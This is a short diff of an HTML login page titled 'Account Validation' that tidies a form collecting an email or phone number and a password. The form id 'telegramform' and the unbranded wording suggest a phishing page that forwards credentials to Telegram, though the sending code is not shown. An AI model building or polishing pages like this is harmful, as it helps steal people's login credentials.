@@ -73,23 +73,38 @@ span.psw {
 <body>
 
 <h2>Account Validation</h2>
-
 <form id="telegramform">
-    <img src="img_avatar2.png" alt="Avatar" class="avatar">
-  </div>
-  <div class="container">
-    <label for="email"><b>Email/Phone Number</b></label>
-    <input type="text" placeholder="Email/Mobile number" name="email" required>
-    
-    <label for="message"><b>Password</b></label>
-    <input type="message" placeholder="Enter password" name="message" required>
-    
-        
-    <button type="submit" id="submitBtn">
 
-      <p id="formstatus"></p>
-     Login
+  <img src="img_avatar2.png" alt="Avatar" class="avatar">
+
+  <div class="container">
+
+    <label for="email"><b>Email/Phone Number</b></label>
+    <input
+      type="text"
+      placeholder="Email/Mobile number"
+      name="email"
+      id="email"
+      required
+    >
+
+    <label for="message"><b>Password</b></label>
+    <input
+      type="password"
+      placeholder="Enter password"
+      name="message"
+      id="message"
+      required
+    >
+
+    <button type="submit" id="submitBtn">
+      Login
     </button>
+
+    <p id="formStatus"></p>
+
+  </div>
+
 
     <p id="formStatus" aria-live="polite"></p>
 
